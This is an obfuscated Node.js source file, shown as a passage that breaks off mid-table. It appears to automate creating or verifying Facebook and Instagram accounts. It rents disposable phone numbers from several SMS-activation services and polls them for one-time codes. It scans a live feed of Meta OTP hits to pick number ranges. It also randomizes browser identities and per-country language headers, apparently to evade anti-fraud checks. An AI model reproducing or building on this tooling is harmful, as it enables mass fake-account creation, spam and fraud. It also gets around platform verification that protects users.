const fs = require('fs'),
  path = require("path");
const http = require("http"),
  https = require("https"),
  crypto = require("crypto"),
  zlib = require("zlib"),
  readline = require("readline"),
  net = require("net"),
  tls = require("tls");
const isTermuxEnv = fs.existsSync("/data/data/com.termux") || (process.env.PREFIX && process.env.PREFIX.includes("com.termux"));
let chalk;
try {
  chalk = require("chalk");
} catch (v121) {
  const id = v123 => v123,
    v122 = {};
  v122.hex = () => id, v122.white = id, v122.gray = id, v122.green = id, v122.red = id, v122.yellow = id, v122.cyan = id, v122.greenBright = id, v122.redBright = id, v122.bold = id, chalk = v122, chalk.hex = () => id, chalk.white.bold = id;
}
const B = chalk.hex("#8B5CF6"),
  C = chalk.hex("#06D6A0"),
  Y = chalk.hex("#F72585"),
  W = chalk.hex("#E0E0E0"),
  G = chalk.hex("#6B7280"),
  R = chalk.hex("#EF4444"),
  DIM = chalk.hex("#4B5563"),
  FB_CYAN = C,
  FB_GOLD = chalk.hex("#F72585"),
  FB_EMERALD = chalk.hex("#06D6A0").bold,
  FB_AMBER = chalk.hex("#F59E0B").bold,
  FB_PURPLE = chalk.hex("#8B5CF6").bold,
  FB_MUTED = DIM;
const uuid = () => crypto.randomUUID();
let FB_HOST = "www.facebook.com",
  SELECTED_LANG = "random";
const sleep = v124 => new Promise(v125 => setTimeout(v125, v124));
let SELECTED_BROWSER = "random",
  SELECTED_BROWSERS = ["random"];
function setSelectedBrowsers(v126) {
  if (Array.isArray(v126)) {
    if (v126.length === 0x0) SELECTED_BROWSERS = ["random"], SELECTED_BROWSER = "random";else v126.length === 0x1 ? (SELECTED_BROWSERS = [v126[0x0]], SELECTED_BROWSER = v126[0x0]) : (SELECTED_BROWSERS = [...v126], SELECTED_BROWSER = v126.join('+'));
  } else {
    if (typeof v126 === "string") {
      const v127 = v126.split(/[+,]+/).map(v128 => v128.trim()).filter(Boolean);
      if (v127.length > 0x1) SELECTED_BROWSERS = v127, SELECTED_BROWSER = v127.join('+');else v127.length === 0x1 ? (SELECTED_BROWSERS = [v127[0x0]], SELECTED_BROWSER = v127[0x0]) : (SELECTED_BROWSERS = ["random"], SELECTED_BROWSER = "random");
    }
  }
}
class NexaRateLimiter {
  constructor(v129) {
    this.delayMs = v129;
    this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v130) {
    return new Promise((v131, v132) => {
      this.queue.push(async () => {
        try {
          v131(await v130());
        } catch (v133) {
          v132(v133);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v134 = this.queue.shift();
      await v134(), await new Promise(v135 => setTimeout(v135, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v136) {
  return new Promise((v137, v138) => {
    const v139 = {};
    v139.Accept = "text/plain", v139.Connection = "close";
    const v140 = {};
    v140.hostname = "smsbower.page", v140.port = 0x1bb, v140.path = "/stubs/handler_api.php?" + v136;
    v140.method = "GET";
    v140.headers = v139;
    const v141 = v140;
    const v142 = https.request(v141, v143 => {
      let v144 = '';
      v143.on("data", v145 => v144 += v145);
      v143.on("end", () => v137(v144.trim()));
    });
    v142.on("error", v146 => v138(new Error("SmsBower net: " + v146.message))), v142.setTimeout(0x3a98, () => {
      v142.destroy();
      v138(new Error("SmsBower timeout"));
    }), v142.end();
  });
}
function smsBowerFetchNumber(v147, v148, v149, v150) {
  let v151 = "api_key=" + encodeURIComponent(v147) + "&action=getNumber&service=" + encodeURIComponent(v148 || 'fb');
  v149 && String(v149).trim() !== '0' && String(v149).trim() !== '' && (v151 += "&country=" + encodeURIComponent(v149));
  v150 && parseFloat(v150) > 0x0 && (v151 += "&maxPrice=" + encodeURIComponent(v150));
  return smsBowerRequest(v151).then(v152 => {
    if (v152.startsWith("ACCESS_NUMBER:")) {
      const v153 = v152.split(':');
      return {
        'activationId': v153[0x1],
        'phoneNumber': v153[0x2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v152);
  });
}
function smsBowerPollOtp(v154, v155, v156 = 0x927c0) {
  return new Promise(v157 => {
    const v158 = Date.now() + v156,
      fn3 = () => {
        smsBowerRequest("api_key=" + encodeURIComponent(v154) + "&action=getStatus&id=" + v155).then(v159 => {
          if (v159.startsWith("STATUS_OK:")) {
            v157(v159.replace("STATUS_OK:", '').trim());
            return;
          }
          if (v159.startsWith("STATUS_WAIT_RETRY:")) {
            const v160 = v159.replace("STATUS_WAIT_RETRY:", '').trim();
            if (v160 && /^\d{4,8}$/.test(v160)) {
              v157(v160);
              return;
            }
          }
          if (v159 === "STATUS_CANCEL" || v159 === "NO_ACTIVATION") {
            v157(null);
            return;
          }
          if (Date.now() < v158) setTimeout(fn3, 0xfa0);else v157(null);
        }).catch(() => {
          if (Date.now() < v158) setTimeout(fn3, 0xfa0);else v157(null);
        });
      };
    fn3();
  });
}
function smsBowerSetStatus(v161, v162, v163) {
  return smsBowerRequest("api_key=" + encodeURIComponent(v161) + "&action=setStatus&id=" + v162 + "&status=" + v163).catch(() => null);
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v164, v165) {
  return new Promise((v166, v167) => {
    const v168 = {};
    v168.range = v165, v168.is_national = false, v168.remove_plus = false;
    const v169 = JSON.stringify(v168),
      v170 = {
        'hostname': "api.zenexnetwork.com",
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v164,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v169)
        }
      },
      v171 = https.request(v170, v172 => {
        let v173 = '';
        v172.on("data", v174 => v173 += v174), v172.on("end", () => {
          try {
            const v175 = JSON.parse(v173);
            if (v175?.["meta"]?.["code"] === 0xc8 && v175?.["data"]?.["full_number"]) v166(v175.data.full_number.replace(/[^0-9]/g, ''));else v167(new Error(v175?.["message"] || "Zenex: no number"));
          } catch (v176) {
            v167(new Error("Zenex: invalid JSON"));
          }
        });
      });
    v171.on("error", v177 => v167(new Error("Zenex net: " + v177.message)));
    v171.setTimeout(0x3a98, () => {
      v171.destroy(), v167(new Error("Zenex timeout"));
    }), v171.write(v169), v171.end();
  });
}
function zenexPollOtp(v178, v179, v180 = 0x927c0) {
  return new Promise(v181 => {
    const v182 = String(v179).replace(/[^0-9]/g, ''),
      v183 = Date.now() + v180,
      v184 = new Set(),
      fn4 = () => {
        const v185 = {};
        v185.mapikey = v178;
        const v186 = {};
        v186.hostname = "api.zenexnetwork.com", v186.port = 0x1bb;
        v186.path = "/v1/numsuccess/info", v186.method = "GET", v186.headers = v185;
        const v187 = v186,
          v188 = https.request(v187, v189 => {
            let v190 = '';
            v189.on("data", v191 => v190 += v191);
            v189.on("end", () => {
              try {
                const v192 = JSON.parse(v190),
                  v193 = Array.isArray(v192?.["data"]?.["otps"]) ? v192.data.otps : Array.isArray(v192?.["data"]) ? v192.data : [];
                for (const v194 of v193) {
                  const v195 = String(v194.number || v194.copy || '').replace(/[^0-9]/g, '');
                  if (!v195) continue;
                  const v196 = v195.length >= 0x6 && v182.length >= 0x6 ? v195.slice(-8) === v182.slice(-8) || v195.endsWith(v182) || v182.endsWith(v195) : false;
                  if (v196) {
                    const v197 = v194.nid || v195 + '_' + (v194.otp || '');
                    if (!v184.has(v197)) {
                      const v198 = String(v194.otp || '').match(/\b(\d{4,8})\b/);
                      if (v198) {
                        v181(v198[0x1]);
                        return;
                      }
                    }
                  }
                }
              } catch (v199) {}
              if (Date.now() < v183) setTimeout(fn4, 0xfa0);else v181(null);
            });
          });
        v188.on("error", () => {
          if (Date.now() < v183) setTimeout(fn4, 0xfa0);else v181(null);
        }), v188.end();
      };
    fn4();
  });
}
function nexaFetchNumber(v200, v201, v202) {
  return new Promise((v203, v204) => {
    const v205 = {};
    v205.range = v201, v205.format = "normal";
    const v206 = JSON.stringify(v205);
    const v207 = {
      'hostname': "nexaotpservice.com",
      'port': 0x1bb,
      'path': v202 || "/api/v1/numbers/get",
      'method': "POST",
      'headers': {
        'X-API-Key': v200,
        'Content-Type': "application/json",
        'Content-Length': Buffer.byteLength(v206)
      }
    };
    const v208 = https.request(v207, v209 => {
      let v210 = '';
      v209.on("data", v211 => v210 += v211), v209.on("end", () => {
        try {
          const v212 = JSON.parse(v210);
          v212.success && v212.number ? v203(v212.number.replace(/[^0-9]/g, '')) : v204(new Error(v212.error || "NexaOTP: No number returned"));
        } catch (v213) {
          v204(new Error("NexaOTP: Invalid response"));
        }
      });
    });
    v208.on("error", v214 => v204(new Error("NexaOTP network: " + v214.message))), v208.setTimeout(0x2710, () => {
      v208.destroy(), v204(new Error("NexaOTP: Timeout"));
    }), v208.write(v206), v208.end();
  });
}
const twoOoLimiter = new NexaRateLimiter(0x1f4);
function stripRid(v215) {
  return v215.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v216, v217, v218) {
  return new Promise((v219, v220) => {
    const v221 = stripRid(v217),
      v222 = {};
    v222.rid = v221;
    const v223 = JSON.stringify(v222),
      v224 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v218,
        'method': "POST",
        'headers': {
          'mauthapi': v216,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v223)
        }
      },
      v225 = https.request(v224, v226 => {
        let v227 = '';
        v226.on("data", v228 => v227 += v228), v226.on("end", () => {
          try {
            const v229 = JSON.parse(v227);
            if (v229?.["meta"]?.["code"] === 0xc8 && v229?.["data"]?.["no_plus_number"]) v219(v229.data.no_plus_number);else v220(new Error(v229?.["message"] || v229?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v230) {
            v220(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v225.on("error", v231 => v220(new Error("2oo9 network: " + v231.message))), v225.setTimeout(0x2710, () => {
      v225.destroy();
      v220(new Error("2oo9: Timeout"));
    }), v225.write(v223), v225.end();
  });
}
function twoOoFetchConsole(v232, v233) {
  return new Promise((v234, v235) => {
    const v236 = {};
    v236.mauthapi = v232;
    const v237 = {};
    v237.hostname = "api.2oo9.cloud", v237.port = 0x1bb, v237.path = v233;
    v237.method = "GET", v237.headers = v236;
    const v238 = v237,
      v239 = https.request(v238, v240 => {
        let v241 = '';
        v240.on("data", v242 => v241 += v242);
        v240.on("end", () => {
          try {
            const v243 = JSON.parse(v241);
            if (v243?.["meta"]?.["code"] === 0xc8 && Array.isArray(v243?.["data"]?.["hits"])) v234(v243.data.hits);else v235(new Error(v243?.["message"] || "Console fetch failed"));
          } catch (v244) {
            v235(new Error("Console: Invalid JSON"));
          }
        });
      });
    v239.on("error", v245 => v235(new Error("Console network: " + v245.message))), v239.setTimeout(0x2710, () => {
      v239.destroy(), v235(new Error("Console timeout"));
    }), v239.end();
  });
}
function parseTwoOoRangeSelection(v246, v247) {
  const v248 = new Set(),
    v249 = v246.split(/[\s,]+/).filter(v250 => v250);
  for (const v251 of v249) {
    const v252 = v251.match(/^(\d+)-(\d+)$/);
    if (v252) for (let v253 = +v252[0x1]; v253 <= +v252[0x2]; v253++) {
      if (v253 >= 0x1 && v253 <= v247) v248.add(v253 - 0x1);
    } else {
      const v254 = parseInt(v251);
      if (!isNaN(v254) && v254 >= 0x1 && v254 <= v247) v248.add(v254 - 0x1);
    }
  }
  return [...v248].sort((v255, v256) => v255 - v256);
}
async function autoRangeFinderFor2Oo(v257, v258, v259, v260) {
  const v261 = {};
  v261.facebook = ["facebook", 'fb'], v261.instagram = ["instagram", 'ig'], v261.meta = ["meta"], v261.all = ["facebook", 'fb', "instagram", 'ig', "meta"];
  const v262 = v261,
    v263 = {};
  v263.facebook = "📘 Facebook", v263.instagram = "📸 Instagram", v263.meta = "🌐 Meta", v263.all = "📦 All (FB+IG+Meta)";
  const v264 = v263;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v265 = [];
  try {
    v265 = await twoOoFetchConsole(v257, v258);
  } catch (v280) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v280.message + '\x0a')), null;
  }
  const v266 = v265.slice(0x0, 0x64);
  if (v266.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v267 = {};
  v267.name = "📘 Facebook", v267.value = "facebook";
  const v268 = {};
  v268.name = "📸 Instagram", v268.value = "instagram";
  const v269 = {};
  v269.name = "🌐 Meta", v269.value = "meta";
  const v270 = {};
  v270.name = "📦 All (FB+IG+Meta)";
  v270.value = "all";
  const v271 = await v259("Filter by app:", [v267, v268, v269, v270]),
    v272 = v262[v271],
    v273 = v266.filter(v281 => {
      const v282 = (v281.sid || '').toLowerCase(),
        v283 = (v281.message || '').toLowerCase();
      return v272.some(v284 => v282.includes(v284) || v283.includes(v284));
    });
  if (v273.length === 0x0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v274 = {},
    v275 = {};
  for (const v285 of v273) {
    const v286 = v285.range || '';
    if (!v286) continue;
    v274[v286] = (v274[v286] || 0x0) + 0x1;
    const v287 = {};
    v287.facebook = 0x0, v287.instagram = 0x0, v287.meta = 0x0, v275[v286] = v275[v286] || v287;
    if (v262.facebook.some(v288 => (v285.sid || '').toLowerCase().includes(v288) || (v285.message || '').toLowerCase().includes(v288))) v275[v286].facebook++;
    if (v262.instagram.some(v289 => (v285.sid || '').toLowerCase().includes(v289) || (v285.message || '').toLowerCase().includes(v289))) v275[v286].instagram++;
    if (v262.meta.some(v290 => (v285.sid || '').toLowerCase().includes(v290) || (v285.message || '').toLowerCase().includes(v290))) v275[v286].meta++;
  }
  const v276 = Object.entries(v274).sort((v291, v292) => v292[0x1] - v291[0x1]).slice(0x0, 0x5);
  if (v276.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v277 = {};
  v277.name = "⚡ Auto detect & send (#1 range)", v277.value = "auto";
  const v278 = {};
  v278.name = "📊 Show top 5 & select", v278.value = "select";
  const v279 = await v259("Range Finder mode:", [v277, v278]);
  if (v279 === "auto") {
    const [v293, v294] = v276[0x0],
      v295 = v275[v293] || {},
      v296 = [];
    if (v295.facebook) v296.push("📘FB(" + v295.facebook + ')');
    if (v295.instagram) v296.push("📸IG(" + v295.instagram + ')');
    if (v295.meta) v296.push("🌐Meta(" + v295.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v293 + "  (" + v294 + " hits)  " + v296.join('\x20') + '\x0a')), [v293];
  } else {
    console.log(chalk.cyan("\n  App: " + v264[v271] + "  |  Scanned: " + v273.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(0x16))), v276.forEach(([v300, v301], v302) => {
      const v303 = v275[v300] || {},
        v304 = [];
      if (v303.facebook) v304.push("📘FB(" + v303.facebook + ')');
      if (v303.instagram) v304.push("📸IG(" + v303.instagram + ')');
      if (v303.meta) v304.push("🌐Meta(" + v303.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v302 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v300.padEnd(0x10)) + chalk.yellow(String(v301).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v301, 0xc)) + '\x20\x20') + (v304.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v297 = await v260("Select ranges:", ''),
      v298 = parseTwoOoRangeSelection(v297, v276.length);
    if (v298.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v299 = v298.map(v305 => v276[v305][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v299.join(',\x20') + '\x0a')), v299;
  }
}
let dataBytesTotal = 0x0;
function trackBytes(v306) {
  dataBytesTotal += v306;
}
function dataMB() {
  return (dataBytesTotal / 0x400 / 0x400).toFixed(0x2);
}
const DEBUG_LOG = false,
  DEBUG_TXT_FILE = require("path").join(__dirname, "debug.txt"),
  CONFIRM_DEBUG_FILE = require("path").join(__dirname, "confirm_debug.txt");
function dbg(v307) {
  if (!DEBUG_LOG) return;
  const v308 = '[' + new Date().toISOString() + ']\x20' + v307 + '\x0a';
  try {
    fs.appendFileSync(DEBUG_TXT_FILE, v308);
  } catch (v309) {}
  try {
    process.stdout.write(v308);
  } catch (v310) {}
}
function cdbg(v311) {
  if (!DEBUG_LOG) return;
  const v312 = '[' + new Date().toISOString() + ']\x20' + v311 + '\x0a';
  try {
    fs.appendFileSync(CONFIRM_DEBUG_FILE, v312);
  } catch (v313) {}
  try {
    process.stdout.write(v312);
  } catch (v314) {}
}
const v1 = {};
v1.US = "en-US,en;q=0.9", v1.CA = "en-CA,en;q=0.9,fr-CA;q=0.8", v1.MX = "es-MX,es;q=0.9,en;q=0.8", v1.BR = "pt-BR,pt;q=0.9,en;q=0.8", v1.AR = "es-AR,es;q=0.9,en;q=0.8", v1.CO = "es-CO,es;q=0.9", v1.CL = "es-CL,es;q=0.9", v1.PE = "es-PE,es;q=0.9", v1.VE = "es-VE,es;q=0.9", v1.EC = "es-EC,es;q=0.9", v1.BO = "es-BO,es;q=0.9", v1.PY = "es-PY,es;q=0.9", v1.UY = "es-UY,es;q=0.9", v1.CU = "es-CU,es;q=0.9", v1.DO = "es-DO,es;q=0.9", v1.GT = "es-GT,es;q=0.9", v1.HN = "es-HN,es;q=0.9", v1.SV = "es-SV,es;q=0.9", v1.NI = "es-NI,es;q=0.9", v1.CR = "es-CR,es;q=0.9", v1.PA = "es-PA,es;q=0.9", v1.JM = "en-JM,en;q=0.9", v1.TT = "en-TT,en;q=0.9", v1.BB = "en-BB,en;q=0.9", v1.GY = "en-GY,en;q=0.9", v1.SR = "nl-SR,nl;q=0.9,en;q=0.8", v1.HT = "fr-HT,fr;q=0.9,ht;q=0.8", v1.PR = "es-PR,es;q=0.9,en;q=0.8", v1.BZ = "en-BZ,en;q=0.9", v1.GB = "en-GB,en;q=0.9", v1.IE = "en-IE,en;q=0.9", v1.FR = "fr-FR,fr;q=0.9,en;q=0.8", v1.DE = "de-DE,de;q=0.9,en;q=0.8", v1.ES = "es-ES,es;q=0.9,en;q=0.8", v1.IT = "it-IT,it;q=0.9,en;q=0.8", v1.PT = "pt-PT,pt;q=0.9,en;q=0.8", v1.NL = "nl-NL,nl;q=0.9,en;q=0.8", v1.BE = "nl-BE,nl;q=0.9,fr-BE;q=0.8", v1.CH = "de-CH,de;q=0.9,fr-CH;q=0.8,it-CH;q=0.7", v1.AT = "de-AT,de;q=0.9", v1.LU = "fr-LU,fr;q=0.9", v1.SE = "sv-SE,sv;q=0.9,en;q=0.8", v1.NO = "nb-NO,nb;q=0.9,en;q=0.8", v1.DK = "da-DK,da;q=0.9,en;q=0.8", v1.FI = "fi-FI,fi;q=0.9,en;q=0.8", v1.IS = "is-IS,is;q=0.9,en;q=0.8", v1.PL = "pl-PL,pl;q=0.9,en;q=0.8", v1.CZ = "cs-CZ,cs;q=0.9,en;q=0.8", v1.SK = "sk-SK,sk;q=0.9,en;q=0.8", v1.HU = "hu-HU,hu;q=0.9,en;q=0.8", v1.RO = "ro-RO,ro;q=0.9,en;q=0.8", v1.BG = "bg-BG,bg;q=0.9,en;q=0.8", v1.HR = "hr-HR,hr;q=0.9,en;q=0.8", v1.SI = "sl-SI,sl;q=0.9,en;q=0.8", v1.BA = "bs-BA,bs;q=0.9,hr;q=0.8", v1.RS = "sr-RS,sr;q=0.9,en;q=0.8", v1.AL = "sq-AL,sq;q=0.9,en;q=0.8", v1.MK = "mk-MK,mk;q=0.9,en;q=0.8", v1.GR = "el-GR,el;q=0.9,en;q=0.8", v1.CY = "el-CY,el;q=0.9,en;q=0.8", v1.TR = "tr-TR,tr;q=0.9,en;q=0.8", v1.RU = "ru-RU,ru;q=0.9,en;q=0.8", v1.UA = "uk-UA,uk;q=0.9,ru;q=0.8", v1.BY = "be-BY,be;q=0.9,ru;q=0.8", v1.MD = "ro-MD,ro;q=0.9,ru;q=0.8", v1.LT = "lt-LT,lt;q=0.9,en;q=0.8", v1.LV = "lv-LV,lv;q=0.9,en;q=0.8", v1.EE = "et-EE,et;q=0.9,en;q=0.8", v1.AM = "hy-AM,hy;q=0.9,en;q=0.8", v1.GE = "ka-GE,ka;q=0.9,en;q=0.8", v1.AZ = "az-AZ,az;q=0.9,en;q=0.8", v1.KZ = "kk-KZ,kk;q=0.9,ru;q=0.8", v1.MT = "mt-MT,mt;q=0.9,en;q=0.8", v1.ME = "sr-ME,sr;q=0.9", v1.XK = "sq-XK,sq;q=0.9", v1.LI = "de-LI,de;q=0.9", v1.MC = "fr-MC,fr;q=0.9", v1.SM = "it-SM,it;q=0.9", v1.VA = "it-VA,it;q=0.9", v1.AD = "ca-AD,ca;q=0.9,es;q=0.8", v1.SA = "ar-SA,ar;q=0.9,en;q=0.8", v1.AE = "ar-AE,ar;q=0.9,en;q=0.8", v1.QA = "ar-QA,ar;q=0.9,en;q=0.8", v1.KW = "ar-KW,ar;q=0.9,en;q=0.8", v1.BH = "ar-BH,ar;q=0.9,en;q=0.8", v1.OM = "ar-OM,ar;q=0.9,en;q=0.8", v1.YE = "ar-YE,ar;q=0.9", v1.IQ = "ar-IQ,ar;q=0.9", v1.SY = "ar-SY,ar;q=0.9", v1.JO = "ar-JO,ar;q=0.9,en;q=0.8", v1.LB = "ar-LB,ar;q=0.9,fr;q=0.8", v1.IL = "he-IL,he;q=0.9,en;q=0.8", v1.IR = "fa-IR,fa;q=0.9,en;q=0.8", v1.PS = "ar-PS,ar;q=0.9", v1.IN = "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7", v1.PK = "ur-PK,ur;q=0.9,en;q=0.8", v1.BD = "bn-BD,bn;q=0.9,en;q=0.8", v1.LK = "si-LK,si;q=0.9,en;q=0.8", v1.NP = "ne-NP,ne;q=0.9,en;q=0.8", v1.CN = "zh-CN,zh;q=0.9,en;q=0.8", v1.TW = "zh-TW,zh;q=0.9,en;q=0.8", v1.HK = "zh-HK,zh;q=0.9,en;q=0.8", v1.JP = "ja-JP,ja;q=0.9,en;q=0.8", v1.KR = "ko-KR,ko;q=0.9,en;q=0.8", v1.VN = "vi-VN,vi;q=0.9,en;q=0.8", v1.TH = "th-TH,th;q=0.9,en;q=0.8", v1.MY = "ms-MY,ms;q=0.9,en;q=0.8", v1.SG = "en-SG,en;q=0.9,zh;q=0.8", v1.ID = "id-ID,id;q=0.9,en;q=0.8", v1.PH = "fil-PH,fil;q=0.9,en;q=0.8", v1.MM = "my-MM,my;q=0.9,en;q=0.8", v1.KH = "km-KH,km;q=0.9,en;q=0.8", v1.LA = "lo-LA,lo;q=0.9,en;q=0.8", v1.MN = "mn-MN,mn;q=0.9", v1.AF = "ps-AF,ps;q=0.9,fa;q=0.8", v1.BT = "dz-BT,dz;q=0.9,en;q=0.8", v1.MV = "dv-MV,dv;q=0.9,en;q=0.8", v1.TL = "pt-TL,pt;q=0.9,en;q=0.8", v1.PG = "en-PG,en;q=0.9", v1.FJ = "en-FJ,en;q=0.9", v1.AU = "en-AU,en;q=0.9", v1.NZ = "en-NZ,en;q=0.9", v1.UZ = "uz-UZ,uz;q=0.9,ru;q=0.8", v1.TM = "tk-TM,tk;q=0.9,ru;q=0.8", v1.TJ = "tg-TJ,tg;q=0.9,ru;q=0.8", v1.KG = "ky-KG,ky;q=0.9,ru;q=0.8", v1.NG = "en-NG,en;q=0.9", v1.GH = "en-GH,en;q=0.9", v1.KE = "sw-KE,sw;q=0.9,en;q=0.8", v1.TZ = "sw-TZ,sw;q=0.9,en;q=0.8", v1.UG = "en-UG,en;q=0.9", v1.ZA = "en-ZA,en;q=0.9,af;q=0.8", v1.ET = "am-ET,am;q=0.9,en;q=0.8", v1.EG = "ar-EG,ar;q=0.9,en;q=0.8", v1.DZ = "ar-DZ,ar;q=0.9,fr;q=0.8", v1.MA = "ar-MA,ar;q=0.9,fr;q=0.8", v1.TN = "ar-TN,ar;q=0.9,fr;q=0.8", v1.LY = "ar-LY,ar;q=0.9", v1.SD = "ar-SD,ar;q=0.9", v1.SO = "so-SO,so;q=0.9,ar;q=0.8", v1.CM = "fr-CM,fr;q=0.9,en;q=0.8", v1.CI = "fr-CI,fr;q=0.9", v1.SN = "fr-SN,fr;q=0.9", v1.ML = "fr-ML,fr;q=0.9", v1.BF = "fr-BF,fr;q=0.9", v1.GN = "fr-GN,fr;q=0.9", v1.NE = "fr-NE,fr;q=0.9", v1.TD = "fr-TD,fr;q=0.9,ar;q=0.8", v1.CF = "fr-CF,fr;q=0.9", v1.CD = "fr-CD,fr;q=0.9", v1.CG = "fr-CG,fr;q=0.9", v1.GA = "fr-GA,fr;q=0.9", v1.GQ = "es-GQ,es;q=0.9,fr;q=0.8", v1.ST = "pt-ST,pt;q=0.9", v1.AO = "pt-AO,pt;q=0.9", v1.MZ = "pt-MZ,pt;q=0.9", v1.ZM = "en-ZM,en;q=0.9", v1.ZW = "en-ZW,en;q=0.9", v1.MW = "en-MW,en;q=0.9", v1.NA = "en-NA,en;q=0.9,af;q=0.8", v1.BW = "en-BW,en;q=0.9", v1.LS = "en-LS,en;q=0.9", v1.SZ = "en-SZ,en;q=0.9", v1.RW = "rw-RW,rw;q=0.9,fr;q=0.8,en;q=0.7", v1.BI = "fr-BI,fr;q=0.9", v1.MG = "mg-MG,mg;q=0.9,fr;q=0.8", v1.KM = "ar-KM,ar;q=0.9,fr;q=0.8", v1.MU = "en-MU,en;q=0.9,fr;q=0.8", v1.SC = "fr-SC,fr;q=0.9,en;q=0.8", v1.DJ = "fr-DJ,fr;q=0.9,ar;q=0.8", v1.ER = "ti-ER,ti;q=0.9,ar;q=0.8", v1.GW = "pt-GW,pt;q=0.9", v1.CV = "pt-CV,pt;q=0.9", v1.SL = "en-SL,en;q=0.9", v1.LR = "en-LR,en;q=0.9", v1.TG = "fr-TG,fr;q=0.9", v1.BJ = "fr-BJ,fr;q=0.9", v1.GM = "en-GM,en;q=0.9", v1.PW = "en-PW,en;q=0.9", v1.FM = "en-FM,en;q=0.9", v1.MH = "en-MH,en;q=0.9", v1.NR = "en-NR,en;q=0.9", v1.KI = "en-KI,en;q=0.9", v1.TV = "en-TV,en;q=0.9", v1.TO = "en-TO,en;q=0.9", v1.WS = "en-WS,en;q=0.9", v1.VU = "bi-VU,bi;q=0.9,fr;q=0.8,en;q=0.7", v1.SB = "en-SB,en;q=0.9";
const COUNTRY_LANG_MAP = v1;
function getPhoneLang(v315) {
  const v316 = detectCountry(v315);
  if (v316 && COUNTRY_LANG_MAP[v316]) return COUNTRY_LANG_MAP[v316];
  return "en-US,en;q=0.9";
}
const v2 = {};
v2['1'] = 'US', v2['20'] = 'EG', v2['27'] = 'ZA', v2['30'] = 'GR', v2['31'] = 'NL', v2['32'] = 'BE', v2['33'] = 'FR', v2['34'] = 'ES', v2['36'] = 'HU', v2['39'] = 'IT', v2['40'] = 'RO', v2['41'] = 'CH', v2['43'] = 'AT', v2['44'] = 'GB', v2['45'] = 'DK', v2['46'] = 'SE', v2['47'] = 'NO', v2['48'] = 'PL', v2['49'] = 'DE', v2['51'] = 'PE', v2['52'] = 'MX', v2['53'] = 'CU', v2['54'] = 'AR', v2['55'] = 'BR', v2['56'] = 'CL', v2['57'] = 'CO', v2['58'] = 'VE', v2['60'] = 'MY', v2['61'] = 'AU', v2['62'] = 'ID', v2['63'] = 'PH', v2['64'] = 'NZ', v2['65'] = 'SG', v2['66'] = 'TH', v2['81'] = 'JP', v2['82'] = 'KR', v2['84'] = 'VN', v2['86'] = 'CN', v2['90'] = 'TR', v2['91'] = 'IN', v2['92'] = 'PK', v2['93'] = 'AF', v2['94'] = 'LK', v2['95'] = 'MM', v2['98'] = 'IR', v2["212"] = 'MA', v2["213"] = 'DZ', v2["216"] = 'TN', v2["218"] = 'LY';
v2["220"] = 'GM', v2["221"] = 'SN', v2["223"] = 'ML', v2["224"] = 'GN', v2["225"] = 'CI', v2["226"] = 'BF', v2["227"] = 'NE', v2["228"] = 'TG', v2["229"] = 'BJ', v2["230"] = 'MU', v2["231"] = 'LR', v2["232"] = 'SL', v2["233"] = 'GH', v2["234"] = 'NG', v2["235"] = 'TD', v2["236"] = 'CF', v2["237"] = 'CM', v2["240"] = 'GQ', v2["241"] = 'GA';
v2["242"] = 'CG', v2["243"] = 'CD', v2["244"] = 'AO', v2["248"] = 'SC', v2["249"] = 'SD', v2["250"] = 'RW', v2["251"] = 'ET', v2["252"] = 'SO', v2["254"] = 'KE', v2["255"] = 'TZ', v2["256"] = 'UG', v2["257"] = 'BI', v2["258"] = 'MZ', v2["260"] = 'ZM', v2["261"] = 'MG', v2["263"] = 'ZW', v2["264"] = 'NA', v2["265"] = 'MW', v2["351"] = 'PT', v2["352"] = 'LU', v2["353"] = 'IE', v2["354"] = 'IS', v2["355"] = 'AL', v2["358"] = 'FI', v2["359"] = 'BG', v2["370"] = 'LT', v2["371"] = 'LV', v2["372"] = 'EE', v2["373"] = 'MD', v2["374"] = 'AM', v2["375"] = 'BY', v2["380"] = 'UA', v2["381"] = 'RS', v2["385"] = 'HR', v2["386"] = 'SI', v2["387"] = 'BA', v2["420"] = 'CZ', v2["421"] = 'SK', v2["591"] = 'BO', v2["593"] = 'EC', v2["595"] = 'PY', v2["598"] = 'UY', v2["852"] = 'HK', v2["855"] = 'KH', v2["856"] = 'LA', v2["880"] = 'BD', v2["886"] = 'TW', v2["960"] = 'MV', v2["961"] = 'LB', v2["962"] = 'JO', v2["963"] = 'SY', v2["964"] = 'IQ', v2["965"] = 'KW', v2["966"] = 'SA', v2["967"] = 